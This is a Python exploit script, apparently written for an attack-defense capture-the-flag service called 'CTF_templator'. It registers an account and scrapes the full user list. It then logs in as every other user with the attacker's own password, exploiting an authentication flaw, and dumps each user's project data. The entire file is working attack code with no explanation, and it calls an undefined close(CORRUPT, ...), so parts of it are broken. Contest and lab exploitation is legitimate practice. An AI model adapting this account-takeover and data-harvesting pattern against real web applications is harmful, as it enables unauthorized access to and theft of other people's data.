#!/usr/bin/env python3
import random
import string
import sys
import requests
import re
import os
import json
from bs4 import BeautifulSoup

PORT = "31337"


def generate_email():
    return "{}@{}.{}".format(generate_rand(10), generate_rand(5), generate_rand(2))


def generate_rand(N=16):
    return ''.join(random.choice(string.ascii_letters) for i in range(N))


def signin(s,resp, team_addr,username,password):
    match = re.search(r"name=\"csrf_token\".+value=\"([A-z0-9\.-]{80,100})\"", resp.text)

    if match:
        csrf_token = match.group(1)
    else:
        close(CORRUPT, "No csrf token at Sign In page")
    
    resp = s.post("http://{}:{}/signin".format(team_addr, PORT), {
            "username":username,
            "password":password,
            "csrf_token":csrf_token,
            "submit":"Sign In"})


def signup(s, team_addr,username,password,email):
    resp = s.get("http://{}:{}/signup".format(team_addr, PORT))
    match = re.search(r"name=\"csrf_token\".+value=\"([A-z0-9\.-]{80,100})\"", resp.text)

    if match:
        csrf_token = match.group(1)
    else:
        close(CORRUPT, "No csrf token at Sign In page")

    resp = s.post("http://{}:{}/signup".format(team_addr, PORT), {
            "firstname":username,
            "lastname":username,
            "username":username,
            "password":password,
            "email": email,
            "csrf_token":csrf_token,
            "submit":"Sign Up"})
    return resp

if __name__ == '__main__':
    team_addr = sys.argv[1]
    s = requests.Session() 
    username  = generate_rand()
    password = generate_rand()
    email = generate_email() 
    resp = signup(s, team_addr, username, password, email)
    signin(s, resp, team_addr, username,password) 
    CTF_templator = s.get("http://{}:{}/CTF_templator".format(team_addr, PORT))
    soup = BeautifulSoup(CTF_templator.text, 'html.parser')
    soup = soup.find(id='Users_bottom')
    for user in soup.find_all('option'):
        s = requests.Session() 
        resp = s.get("http://{}:{}/signin".format(team_addr, PORT))
        signin(s, resp, team_addr, user, password) 
        CTF_templator = s.get("http://{}:{}/CTF_templator".format(team_addr, PORT))
        projects = BeautifulSoup(CTF_templator.text, 'html.parser')
        projects = projects.find(id='Project_bottom')
        if projects:
            for project in projects.find_all('option'):
                if project.text!="Create at least one project":
                    params = {"project": project.text}
                    resp = s.get("http://{}:{}/project_selection".format(team_addr, PORT), params=params)
                    results = json.loads(resp.text)
                    if results['result']!=[]:
                        id = results['result'][0].get('_id')
                        params = {"id": id}
                        resp = s.get("http://{}:{}/get_info".format(team_addr, PORT), params=params)
                        print(resp.text)





        
